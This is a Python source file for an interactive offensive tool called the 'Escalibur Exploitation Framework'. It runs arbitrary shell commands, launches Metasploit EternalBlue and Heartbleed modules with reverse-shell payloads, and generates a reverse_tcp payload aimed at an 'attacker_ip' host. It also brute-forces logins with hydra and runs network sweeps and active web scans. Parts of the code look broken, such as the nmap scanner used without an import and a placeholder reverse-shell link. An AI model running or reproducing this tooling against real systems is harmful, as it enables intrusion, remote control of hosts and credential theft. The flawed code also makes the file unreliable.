import subprocess
import os
import threading
from datetime import datetime
import random
import string
import gvsa  # Import gvsa for vulnerability scanning
from zapv2 import ZAPv2  # Import ZAPv2 for web application testing
from metasploit.msfrpc import MsfRpcClient  # Import MsfRpcClient for payload generation

class EscaliburExploitationFramework:
    def __init__(self):
        self.nm = nmap.PortScanner()

    def execute_command(self, command):
        try:
            if command.startswith("exit"):
                os._exit(0)
            elif command.startswith("help"):
                return "Available commands:\n- execute <command>\n- list_files [<directory>]\n- system_info\n- escalate_privileges\n- show_exploits\n- exploit <exploit_name>\n- connect <ip_address>\n- RHOST <ip_address>\n- LHOST <ip_address>\n- run_exploit\n- generate_link\n- dns_spoofing\n- network_scan\n- vulnerability_scan\n- password_cracking\n- web_application_testing\n- payload_generation"
            elif command.startswith("execute"):
                command = command.split(" ", 1)[1]
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode()
            elif command.startswith("list_files"):
                directory = command.split(" ", 1)[1] if len(command.split(" ")) > 1 else "."
                files = os.listdir(directory)
                return "\n".join(files)
            elif command.startswith("system_info"):
                uname = subprocess.check_output("uname -a", shell=True).decode()
                hostname = subprocess.check_output("hostname", shell=True).decode()
                ip_address = subprocess.check_output("hostname -I", shell=True).decode()
                return f"Hostname: {hostname}\nIP Address: {ip_address}\nSystem Info: {uname}"
            elif command.startswith("escalate_privileges"):
                if os.getuid() != 0:
                    return subprocess.check_output("sudo -l", shell=True).decode()
                else:
                    return "Already running with root privileges."
            elif command.startswith("show_exploits"):
                return "Available exploits:\n- eternalblue\n- heartbleed"
            elif command.startswith("exploit"):
                exploit_name = command.split(" ", 1)[1]
                return self.run_exploit(exploit_name)
            elif command.startswith("connect"):
                ip_address = command.split(" ", 1)[1]
                return f"Connected to {ip_address}"
            elif command.startswith("RHOST"):
                ip_address = command.split(" ", 1)[1]
                return f"Target IP set to {ip_address}"
            elif command.startswith("LHOST"):
                ip_address = command.split(" ", 1)[1]
                return f"Local IP set to {ip_address}"
            elif command.startswith("run_exploit"):
                return self.run_exploit_menu()
            elif command.startswith("generate_link"):
                return self.generate_reverse_shell_link()
            elif command.startswith("dns_spoofing"):
                return "DNS Spoofing feature is not yet implemented."
            elif command.startswith("network_scan"):
                return self.network_scan()
            elif command.startswith("vulnerability_scan"):
                return self.vulnerability_scan()
            elif command.startswith("password_cracking"):
                return self.password_cracking()
            elif command.startswith("web_application_testing"):
                return self.web_application_testing()
            elif command.startswith("payload_generation"):
                return self.payload_generation()
            else:
                return "Invalid command"
        except Exception as e:
            return str(e)

    def run_exploit(self, exploit_name):
        exploit_map = {
            "eternalblue": {
                "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {}; set payload windows/meterpreter/reverse_tcp; set LHOST {}; exploit'"
            },
            "heartbleed": {
                "command": "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {}; set payload generic/shell_reverse_tcp; set LHOST {}; exploit'"
            }
        }
        exploit = exploit_map.get(exploit_name.lower())
        if exploit:
            target_ip = "127.0.0.1"
            local_ip = "127.0.0.1"
            command = exploit["command"].format(target_ip, local_ip)
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode()
            except Exception as e:
                return str(e)
        else:
            return f"Exploit '{exploit_name}' not found"

    def run_exploit_menu(self):
        exploit_name = input("Enter the name of the exploit: ")
        return self.run_exploit(exploit_name)

    def generate_reverse_shell_link(self):
        local_ip = "127.0.0.1"  # Change this to your local IP
        port = 4444  # Change this to your desired port
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        link = f"http://{local_ip}:{port}/{random_string}.html"
        return f"Reverse Shell Link: {link}"

    def network_scan(self):
        target = input("Enter the target IP range (e.g., 192.168.1.0/24): ")
        self.nm.scan(hosts=target, arguments='-n -sP -PE -PA21,23,80,3389')
        hosts_list = [(x, self.nm[x]['status']['state']) for x in self.nm.all_hosts()]
        return "\n".join([f"Host: {host}, Status: {status}" for host, status in hosts_list])

    def vulnerability_scan(self):
        target = input("Enter the target IP or IP range to scan: ")
        scanner = gvsa.Scanner()
        scan_result = scanner.scan(target)
        return scan_result.summary

    def password_cracking(self):
        target = input("Enter the target IP or hostname: ")
        username = input("Enter the username: ")
        password_list = input("Enter the path to the password list: ")
        result = subprocess.check_output(["hydra", "-l", username, "-P", password_list, target])
        return result.decode()

    def web_application_testing(self):
        target_url = input("Enter the URL of the web application to test: ")
        api_key = input("Enter your ZAP API key: ")
        zap = ZAPv2(apikey=api_key)
        zap.urlopen(target_url)
        zap.spider.scan(target_url)
        zap.ascan.scan(target_url)
        # Retrieve and parse scan results
        return "Web application testing completed. Check ZAP UI for results."

    def payload_generation(self):
        client = MsfRpcClient("password")
        exploit = client.modules.use("payload", "generic/shell_reverse_tcp")
        payload = exploit.execute( {"LHOST": "attacker_ip", "LPORT": 4444} )
        return payload["payload"]

    # Other methods remain unchanged

def main():
    framework = EscaliburExploitationFramework()
    while True:
        user_input = input("> ")
        output = framework.execute_command(user_input)
        print(output)

if __name__ == "__main__":
    main()
